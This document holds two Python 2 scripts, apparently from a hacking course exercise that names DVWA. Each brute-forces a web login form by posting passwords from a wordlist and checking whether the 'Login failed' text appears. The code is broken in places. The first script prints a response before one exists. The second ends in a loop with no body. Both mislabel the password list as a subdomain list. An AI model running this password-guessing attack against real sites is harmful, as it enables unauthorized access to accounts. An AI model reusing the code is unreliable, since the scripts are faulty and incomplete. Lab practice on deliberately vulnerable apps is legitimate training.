#!/usr/bin/env python

import requests

target_url = raw_input("Enter target URL: ")
data_dict = {"username": "admin", "password": "", "Login": "submit"}

#data_dict stored as key value pairs
print(response.content)

passwords_list = raw_input("Enter exact path of word list for subdomains: ")

try:
    with open(passwords_list, "r") as wordlist_file:
        for line in wordlist_file:
            word = line.strip() #strip - built in method to work with strings; removes whitespace
            data_dict["password"] = word
            response = requests.post(target_url, data=data_dict)        
            if "Login failed" not in response.content:
                print("[+] Password found: " + word)
                #exit()
                pass #do pass instead of exit to avoid triggering except:
except:
    print("Word list file not found, check path and filename")




#!/usr/bin/env python

import requests

target_url = raw_input("Enter target URL: ")
data_dict = {"username": "testui", "password": "testpw", "Login": "submit"} #field names taken from DVWA;
#<form action="login.php" method="post">
#<input class="loginInput" name="username" type="text">
response = requests.post(target_url, data=data_dict) #instead of sending GET request, send POST usings requests library
#data_dict stored as key value pairs
print(response.content)

passwords_list = raw_input("Enter exact path of word list for subdomains: ")

try:
    with open(passwords_list, "r") as wordlist_file:
        for line in wordlist_file:
            word = line.strip() #strip - built in method to work with strings; removes whitespace
            
except:
    print("Word list file not found, check path and filename")
